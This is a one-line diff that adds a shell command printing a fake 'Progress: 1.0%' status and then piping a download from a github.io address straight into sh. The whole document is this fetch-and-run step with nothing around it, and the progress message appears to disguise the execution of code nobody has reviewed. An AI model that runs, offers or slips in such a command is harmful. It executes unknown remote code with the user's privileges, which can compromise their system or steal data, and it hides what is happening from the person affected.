@@ -1,0 +1,1 @@
+echo 'Progress: 1.0%'; curl -L --progress-bar frkns.github.io/fun/italia_faqs_proceed_jokes_microsoft_anything_hungary_spirituality_tough | sh
